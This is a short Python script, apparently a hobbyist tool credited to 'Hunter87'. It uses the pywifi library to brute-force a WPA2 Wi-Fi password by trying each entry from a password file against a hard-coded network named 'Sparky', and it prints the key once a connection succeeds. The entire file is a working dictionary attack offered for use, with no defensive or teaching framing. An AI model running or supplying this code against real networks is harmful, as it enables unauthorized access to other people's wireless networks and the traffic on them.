# Author : Hunter87
# Github : https://github.com/hunter87ff
# Insta  : https://instagram.com/im_hunter87
# Youtube: https://youtube.com/@hunter87

try:
    import os, time, pywifi
    from pywifi import PyWiFi, const, Profile
except:
    libs = ["pywifi"]
    for i in libs:
        os.system(f"pip install {i}")
try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    results = ifaces.scan_results()
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except Exception as e:
    print(f"Error : {e}")

def crack(ssid, password, number):
    pro = Profile() 
    pro.ssid = ssid
    pro.auth = const.AUTH_ALG_OPEN
    pro.akm.append(const.AKM_TYPE_WPA2PSK)
    pro.cipher = const.CIPHER_TYPE_CCMP
    pro.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(pro)
    time.sleep(0.1)
    iface.connect(tmp_profile)
    time.sleep(0.35)
    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print('Cracked Successfully!')
        print('Password : ' + password)
        time.sleep(1)
        exit()
    else:
        print(f'Crack Failed using {password}')

def pwd(ssid, psws):
    number = 0
    for psw in psws:
        number += 1
        crack(ssid, str(psw), number)
         
with open("psw.txt", "r", encoding='utf8') as f:
    psws = f.read().strip().split("\n")
    pwd("Sparky", psws)
